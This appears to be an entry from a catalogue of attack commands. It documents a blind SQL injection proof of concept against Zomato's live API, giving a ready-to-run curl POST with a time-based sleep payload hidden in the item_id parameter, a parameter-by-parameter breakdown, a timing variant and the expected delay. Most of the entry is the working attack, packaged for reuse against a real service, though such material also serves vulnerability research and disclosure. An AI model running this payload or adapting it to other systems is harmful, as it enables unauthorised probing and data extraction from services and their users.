---
data: >-
  curl -X POST "https://www.zomato.com/php/██████████" -d
  "res_id=1111&method=add_menu_item_tags&item_id=1111-sleep/*f*/(10)&new_tags[]=3&menu_id=1111"
tags:
  - sqli
  - poc
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:10.224Z'
id: 08ebe25a-63fd-4067-8ded-8c76547ce83c
verified: false
validated: true
submitted: true
---
# zomato-sqli-sleep-poc

## Command

```bash
curl -X POST "https://www.zomato.com/php/██████████" \
  -d "res_id=1111&method=add_menu_item_tags&item_id=1111-sleep/*f*/(10)&new_tags[]=3&menu_id=1111"
```

## Description

Sends a POST request to Zomato's API with a sleep payload in item_id to prove blind SQL injection by causing a 10-second delay.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-d` | POST body data | Yes |
| `res_id=1111` | Restaurant ID | Yes |
| `method=add_menu_item_tags` | API method | Yes |
| `item_id=1111-sleep/*f*/(10)` | Payload with prefix and sleep | Yes |
| `new_tags[]=3` | Tags array | Yes |
| `menu_id=1111` | Menu ID | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "https://www.zomato.com/php/██████████" -d "res_id=1111&method=add_menu_item_tags&item_id=1111-sleep/*f*/(10)&new_tags[]=3&menu_id=1111"
```

### Advanced Usage

Add timing: ```bash
curl ... --write-out "%{time_total}s\n"
```

## Expected Output

HTTP response with ~10s delay; body may show success or partial error, but timing confirms execution.

## Related

- [[Related Procedure: Confirm-SQL-Injection-Vulnerability-Using-Sleep-Payload]]
